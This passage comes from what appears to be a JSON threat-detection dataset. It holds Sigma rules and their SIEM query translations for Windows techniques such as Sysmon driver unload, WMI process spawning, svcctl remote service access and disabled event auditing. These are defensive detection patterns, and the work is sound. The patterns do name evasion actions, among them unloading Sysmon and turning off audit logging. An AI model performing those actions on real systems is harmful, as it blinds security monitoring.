Syndicasec in Thrip report by Symantec)\nreferences:\n    - https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets\n    - https://app.any.run/tasks/61a296bb-81ad-4fee-955f-3b399f4aaf4b\ntags:\n    - attack.execution\nauthor: Florian Roth\ndate: 2018/06/22\nmodified: 2018/12/11\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - '*\\sysprep.exe *\\AppData\\\\*'\n            - sysprep.exe *\\AppData\\\\*\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:(*\\\\\\\\sysprep.exe\\\\ *\\\\\\\\AppData\\\\\\\\* OR sysprep.exe\\\\ *\\\\\\\\AppData\\\\\\\\*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Sysprep-on-AppData-Folder <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Sysprep on AppData Folder\",\\n    \"description\": \"Detects suspicious sysprep process start with AppData folder as target (as used by Trojan Syndicasec in Thrip report by Symantec)\",\\n    \"tags\": [\\n      \"attack.execution\"\\n    ],\\n    \"query\": \"CommandLine.keyword:(*\\\\\\\\\\\\\\\\sysprep.exe\\\\\\\\ *\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\* OR sysprep.exe\\\\\\\\ *\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:(*\\\\\\\\\\\\\\\\sysprep.exe\\\\\\\\ *\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\* OR sysprep.exe\\\\\\\\ *\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Sysprep on AppData Folder\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:(*\\\\\\\\sysprep.exe *\\\\\\\\AppData\\\\\\\\* sysprep.exe *\\\\\\\\AppData\\\\\\\\*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"*\\\\\\\\sysprep.exe *\\\\\\\\AppData\\\\\\\\*\" OR CommandLine=\"sysprep.exe *\\\\\\\\AppData\\\\\\\\*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"*\\\\\\\\sysprep.exe *\\\\\\\\AppData\\\\\\\\*\", \"sysprep.exe *\\\\\\\\AppData\\\\\\\\*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*.*\\\\sysprep\\\\.exe .*\\\\AppData\\\\\\\\.*|.*sysprep\\\\.exe .*\\\\AppData\\\\\\\\.*)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious Userinit Child Process\nid: b655a06a-31c0-477a-95c2-3726b83d649d\nstatus: experimental\ndescription: Detects a suspicious child process of userinit\nreferences:\n    - https://twitter.com/SBousseaden/status/1139811587760562176\nauthor: Florian Roth (rule), Samir Bousseaden (idea)\ndate: 2019/06/17\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage: '*\\userinit.exe'\n    filter1:\n        CommandLine: '*\\\\netlogon\\\\*'\n    filter2:\n        Image: '*\\explorer.exe'\n    condition: selection and not filter1 and not filter2\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Administrative scripts\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((ParentImage.keyword:*\\\\\\\\userinit.exe AND (NOT (CommandLine.keyword:*\\\\\\\\netlogon\\\\\\\\*))) AND (NOT (Image.keyword:*\\\\\\\\explorer.exe)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-Userinit-Child-Process <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious Userinit Child Process\",\\n    \"description\": \"Detects a suspicious child process of userinit\",\\n    \"tags\": \"\",\\n    \"query\": \"((ParentImage.keyword:*\\\\\\\\\\\\\\\\userinit.exe AND (NOT (CommandLine.keyword:*\\\\\\\\\\\\\\\\netlogon\\\\\\\\\\\\\\\\*))) AND (NOT (Image.keyword:*\\\\\\\\\\\\\\\\explorer.exe)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((ParentImage.keyword:*\\\\\\\\\\\\\\\\userinit.exe AND (NOT (CommandLine.keyword:*\\\\\\\\\\\\\\\\netlogon\\\\\\\\\\\\\\\\*))) AND (NOT (Image.keyword:*\\\\\\\\\\\\\\\\explorer.exe)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious Userinit Child Process\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((ParentImage.keyword:*\\\\\\\\userinit.exe AND (NOT (CommandLine.keyword:*\\\\\\\\netlogon\\\\\\\\*))) AND (NOT (Image.keyword:*\\\\\\\\explorer.exe)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((ParentImage=\"*\\\\\\\\userinit.exe\" NOT (CommandLine=\"*\\\\\\\\netlogon\\\\\\\\*\")) NOT (Image=\"*\\\\\\\\explorer.exe\")) | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (ParentImage=\"*\\\\\\\\userinit.exe\"  -(CommandLine=\"*\\\\\\\\netlogon\\\\\\\\*\"))  -(Image=\"*\\\\\\\\explorer.exe\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*.*\\\\userinit\\\\.exe)(?=.*(?!.*(?:.*(?=.*.*\\\\\\\\netlogon\\\\\\\\.*))))))(?=.*(?!.*(?:.*(?=.*.*\\\\explorer\\\\.exe)))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Remote Service Activity Detected via SVCCTL named pipe\nid: 586a8d6b-6bfe-4ad9-9d78-888cd2fe50c3\ndescription: Detects remote remote service activity via remote access to the svcctl named pipe\nauthor: Samir Bousseaden\nreferences:\n    - https://blog.menasec.net/2019/03/threat-hunting-26-remote-windows.html\ntags:\n    - attack.lateral_movement\n    - attack.persistence\nlogsource:\n    product: windows\n    service: security\n    description: 'The advanced audit policy setting \"Object Access > Audit Detailed File Share\" must be configured for Success/Failure'\ndetection:\n    selection:\n        EventID: 5145\n        ShareName: \\\\*\\IPC$\n        RelativeTargetName: svcctl\n        Accesses: '*WriteData*'\n    condition: selection\nfalsepositives: \n    - pentesting\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"5145\" AND ShareName.keyword:\\\\\\\\*\\\\\\\\IPC$ AND RelativeTargetName:\"svcctl\" AND Accesses.keyword:*WriteData*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Remote-Service-Activity-Detected-via-SVCCTL-named-pipe <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Remote Service Activity Detected via SVCCTL named pipe\",\\n    \"description\": \"Detects remote remote service activity via remote access to the svcctl named pipe\",\\n    \"tags\": [\\n      \"attack.lateral_movement\",\\n      \"attack.persistence\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"5145\\\\\" AND ShareName.keyword:\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\IPC$ AND RelativeTargetName:\\\\\"svcctl\\\\\" AND Accesses.keyword:*WriteData*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"5145\\\\\" AND ShareName.keyword:\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\IPC$ AND RelativeTargetName:\\\\\"svcctl\\\\\" AND Accesses.keyword:*WriteData*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Remote Service Activity Detected via SVCCTL named pipe\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"5145\" AND ShareName.keyword:\\\\\\\\*\\\\\\\\IPC$ AND RelativeTargetName:\"svcctl\" AND Accesses.keyword:*WriteData*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"5145\" ShareName=\"\\\\\\\\*\\\\\\\\IPC$\" RelativeTargetName=\"svcctl\" Accesses=\"*WriteData*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"5145\" ShareName=\"\\\\\\\\*\\\\\\\\IPC$\" RelativeTargetName=\"svcctl\" Accesses=\"*WriteData*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*5145)(?=.*\\\\\\\\.*\\\\IPC\\\\$)(?=.*svcctl)(?=.*.*WriteData.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Sysmon driver unload\nid: 4d7cda18-1b12-4e52-b45c-d28653210df8\nstatus: experimental\nauthor: Kirill Kiryanov, oscd.community\ndescription: Detect possible Sysmon driver unload\ndate: 2019/10/23\nmodified: 2019/11/07\nreferences:\n    - https://www.darkoperator.com/blog/2018/10/5/operating-offensively-against-sysmon\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        Image|endswith: '\\fltmc.exe'\n        CommandLine|contains|all:\n            - 'unload'\n            - 'sys'\n    condition: selection\nfalsepositives: Unknown\nlevel: high\nfields:\n    - CommandLine\n    - Details", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:*\\\\\\\\fltmc.exe AND CommandLine.keyword:*unload* AND CommandLine.keyword:*sys*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Sysmon-driver-unload <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Sysmon driver unload\",\\n    \"description\": \"Detect possible Sysmon driver unload\",\\n    \"tags\": \"\",\\n    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\fltmc.exe AND CommandLine.keyword:*unload* AND CommandLine.keyword:*sys*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\fltmc.exe AND CommandLine.keyword:*unload* AND CommandLine.keyword:*sys*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Sysmon driver unload\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\nCommandLine = {{_source.CommandLine}}\\\\n    Details = {{_source.Details}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:*\\\\\\\\fltmc.exe AND CommandLine.keyword:*unload* AND CommandLine.keyword:*sys*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"*\\\\\\\\fltmc.exe\" CommandLine=\"*unload*\" CommandLine=\"*sys*\") | table CommandLine,Details", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image=\"*\\\\\\\\fltmc.exe\" CommandLine=\"*unload*\" CommandLine=\"*sys*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\fltmc\\\\.exe)(?=.*.*unload.*)(?=.*.*sys.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Terminal Service Process Spawn\nid: 1012f107-b8f1-4271-af30-5aed2de89b39\nstatus: experimental\ndescription: Detects a process spawned by the terminal service server process (this could be an indicator for an exploitation of CVE-2019-0708)\nreferences:\n    - https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/rdp-stands-for-really-do-patch-understanding-the-wormable-rdp-vulnerability-cve-2019-0708/\nauthor: Florian Roth\ndate: 2019/05/22\ntags:\n    - car.2013-07-002\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        ParentCommandLine: '*\\svchost.exe*termsvcs'\n    filter:\n        Image: '*\\rdpclip.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(ParentCommandLine.keyword:*\\\\\\\\svchost.exe*termsvcs AND (NOT (Image.keyword:*\\\\\\\\rdpclip.exe)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Terminal-Service-Process-Spawn <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Terminal Service Process Spawn\",\\n    \"description\": \"Detects a process spawned by the terminal service server process (this could be an indicator for an exploitation of CVE-2019-0708)\",\\n    \"tags\": [\\n      \"car.2013-07-002\"\\n    ],\\n    \"query\": \"(ParentCommandLine.keyword:*\\\\\\\\\\\\\\\\svchost.exe*termsvcs AND (NOT (Image.keyword:*\\\\\\\\\\\\\\\\rdpclip.exe)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(ParentCommandLine.keyword:*\\\\\\\\\\\\\\\\svchost.exe*termsvcs AND (NOT (Image.keyword:*\\\\\\\\\\\\\\\\rdpclip.exe)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Terminal Service Process Spawn\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(ParentCommandLine.keyword:*\\\\\\\\svchost.exe*termsvcs AND (NOT (Image.keyword:*\\\\\\\\rdpclip.exe)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(ParentCommandLine=\"*\\\\\\\\svchost.exe*termsvcs\" NOT (Image=\"*\\\\\\\\rdpclip.exe\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ParentCommandLine=\"*\\\\\\\\svchost.exe*termsvcs\"  -(Image=\"*\\\\\\\\rdpclip.exe\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\svchost\\\\.exe.*termsvcs)(?=.*(?!.*(?:.*(?=.*.*\\\\rdpclip\\\\.exe)))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: T1047 Wmiprvse Spawning Process\nid: d21374ff-f574-44a7-9998-4a8c8bf33d7d\ndescription: Detects wmiprvse spawning processes\nstatus: experimental\ndate: 2019/08/15\nmodified: 2019/11/10\nauthor: Roberto Rodriguez @Cyb3rWard0g\nreferences:\n    - https://github.com/Cyb3rWard0g/ThreatHunter-Playbook/tree/master/playbooks/windows/02_execution/T1047_windows_management_instrumentation/wmi_win32_process_create_remote.md\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\WmiPrvSe.exe'\n    filter:\n        LogonId: '0x3e7'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(ParentImage.keyword:*\\\\\\\\WmiPrvSe.exe AND (NOT (LogonId:\"0x3e7\")))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/T1047-Wmiprvse-Spawning-Process <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"T1047 Wmiprvse Spawning Process\",\\n    \"description\": \"Detects wmiprvse spawning processes\",\\n    \"tags\": \"\",\\n    \"query\": \"(ParentImage.keyword:*\\\\\\\\\\\\\\\\WmiPrvSe.exe AND (NOT (LogonId:\\\\\"0x3e7\\\\\")))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(ParentImage.keyword:*\\\\\\\\\\\\\\\\WmiPrvSe.exe AND (NOT (LogonId:\\\\\"0x3e7\\\\\")))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'T1047 Wmiprvse Spawning Process\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(ParentImage.keyword:*\\\\\\\\WmiPrvSe.exe AND (NOT (LogonId:\"0x3e7\")))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(ParentImage=\"*\\\\\\\\WmiPrvSe.exe\" NOT (LogonId=\"0x3e7\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ParentImage=\"*\\\\\\\\WmiPrvSe.exe\"  -(LogonId=\"0x3e7\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\WmiPrvSe\\\\.exe)(?=.*(?!.*(?:.*(?=.*0x3e7)))))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [], "command_list": [], "technique_id": "T1013", "parsed_datasets": [], "queries": [{"query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and registry_key_path contains \"\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Print\\\\Monitors\\\\\"", "product": "Azure Sentinel", "name": "Local Port Monitor"}], "possible_detections": [], "attack_paths": []}, {"commands": [], "command_list": [], "technique_id": "T1054", "parsed_datasets": [], "queries": [{"query": "Sysmon| where EventID == 1 and (process_path contains \"fltmc.exe\" or process_command_line contains \"*fltmc*unload*\")", "product": "Azure Sentinel", "name": "Indicator Blocking Driver Unloaded"}, {"query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and  (registry_key_path contains \"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\SysmonDrv\\\\*\"or registry_key_path contains \"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\Sysmon\\\\*\"or registry_key_path contains \"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\Sysmon64\\\\*\")and (process_path !contains \"Sysmon64.exe\" or process_path !contains \"Sysmon.exe\")", "product": "Azure Sentinel", "name": "Indicator Blocking Sysmon Registry Edited From Other Source"}, {"query": "title: Disabling Windows Event Auditing\nid: 69aeb277-f15f-4d2d-b32a-55e883609563\ndescription: 'Detects scenarios where system auditing (ie: windows event log auditing) is disabled. This may be used in a scenario where an entity would want to bypass\n    local logging to evade detection when windows event logging is enabled and reviewed. Also, it is recommended to turn off \"Local Group Policy Object Processing\"\n    via GPO, which will make sure that Active Directory GPOs take precedence over local/edited computer policies via something such as \"gpedit.msc\". Please note,\n    that disabling \"Local Group Policy Object Processing\" may cause an issue in scenarios of one off specific GPO modifications -- however it is recommended to perform\n    these modifications in Active Directory anyways.'\nreferences:\n    - https://bit.ly/WinLogsZero2Hero\ntags:\n    - attack.defense_evasion\n    - attack.t1054\nauthor: '@neu5ron'\nlogsource:\n    product: windows\n    service: security\n    definition: 'Requirements: Audit Policy : Computer Management > Audit Policy Configuration, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Policy Change\\Audit Authorization Policy Change'\ndetection:\n    selection:\n        EventID: 4719\n        AuditPolicyChanges: 'removed'\n    condition: selection\nfalsepositives: \n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Disabling Windows Event Auditing\nid: 69aeb277-f15f-4d2d-b32a-55e883609563\ndescription: 'Detects scenarios where system auditing (ie: windows event log auditing) is disabled. This may be used in a scenario where an entity would want to bypass\n    local logging to evade detection when windows event logging is enabled and reviewed. Also, it is recommended to turn off \"Local Group Policy Object Processing\"\n    via GPO, which will make sure that Active Directory GPOs take precedence over local/edited computer policies via something such as \"gpedit.msc\". Please note,\n    that disabling \"Local Group Policy Object Processing\" may cause an issue in scenarios of one off specific GPO modifications -- however it is recommended to perform\n    these modifications in Active Directory anyways.'\nreferences:\n    - https://bit.ly/WinLogsZero2Hero\ntags:\n    - attack.defense_evasion\n    - attack.t1054\nauthor: '@neu5ron'\nlogsource:\n    product: windows\n    service: security\n    definition: 'Requirements: Audit Policy : Computer Management > Audit Policy Configuration, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Policy Change\\Audit Authorization Policy Change'\ndetection:\n    selection:\n        EventID: 4719\n        AuditPolicyChanges: 'removed'\n    condition: selection\nfalsepositives: \n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"4719\" AND AuditPolicyChanges:\"removed\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Disabling-Windows-Event-Auditing <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Disabling Windows Event Auditing\",\\n    \"description\": \"Detects scenarios where system auditing (ie: windows event log auditing) is disabled. This may be used in a scenario where an entity would want to bypass local logging to evade detection when windows event logging is enabled and reviewed. Also, it is recommended to turn off \\\\\"Local Group Policy Object Processing\\\\\" via GPO, which will make sure that Active Directory GPOs take precedence over local/edited computer policies via something such as \\\\\"gpedit.msc\\\\\". Please note, that disabling \\\\\"Local Group Policy Object Processing\\\\\" may cause an issue in scenarios of one off specific GPO modifications -- however it is recommended to perform these modifications in Active Directory anyways.\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1054\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"4719\\\\\" AND AuditPolicyChanges:\\\\\"removed\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"4719\\\\\" AND AuditPolicyChanges:\\\\\"removed\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Disabling Windows Event Auditing\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              